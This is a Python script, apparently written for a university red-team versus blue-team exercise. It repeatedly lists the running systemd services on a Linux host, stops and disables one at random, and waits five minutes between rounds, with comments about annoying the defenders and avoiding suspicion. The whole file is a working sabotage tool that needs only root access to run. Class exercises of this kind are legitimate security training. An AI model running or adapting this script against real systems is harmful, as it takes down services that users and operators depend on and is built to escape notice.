"""
A Red Team Tool that randomly selects active services on a Linux machine in five minute intervals (modifiable) and stops them.
Meant to annoy and break the Blue Team's setup.

Travis Hill
twh9811@rit.edu
9/21/2023
CSEC 473, Fall 2231, Team Echo
"""

import subprocess
import random
import time

# Put services you don't want touched in here (with .service at the end)
DONT_TOUCH = []

def get_services():
    """
    Runs systemctl command on a Linux machine to gather all services that are currently active and running
    """
    output = subprocess.Popen(["systemctl", "--type=service", "--state=running"], stdout=subprocess.PIPE)
    output = output.stdout.read().decode()
    return output

def select_service(list_of_services_string):
    """
    Takes the output of get_services and parses out the relevant service information, specifically returning its name
    """
    service_list = list_of_services_string.split()
    # Sorts through all strings for services
    service_list = [service for service in service_list if ".service" in service]
    # Select service randomly
    total_services = len(service_list)
    service_number = random.randrange(0, total_services)
    selected_service_string = service_list[service_number]
    return selected_service_string

def disable_service(service_name):
    """
    Takes a service name and disables it on the machine
    """
    process = subprocess.Popen(["systemctl", "stop", service_name])
    process = subprocess.Popen(["systemctl", "disable", service_name])
    process.communicate()

def wait(time_to_wait):
    """
    Pauses script execution for desired amount of time
    """
    time.sleep(time_to_wait)

def main():
    sleep_time = 300
    # Run always to disable services constantly and annoy the Blue Team. 
    while(True):
        # Get new list of services every time so all attackable services are available
        services = get_services()
        # If all services are down, wait to do anything
        if(len(services) == 0):
            wait(sleep_time)
            continue
        # Randomly select a service from the service list
        service = select_service(services)
        # Adds functionality to ignore certain services to avoid bricking
        if(service not in DONT_TOUCH):
            # Disable the service
            disable_service(service)
        # Wait to avoid suspicion
        wait(sleep_time)

main()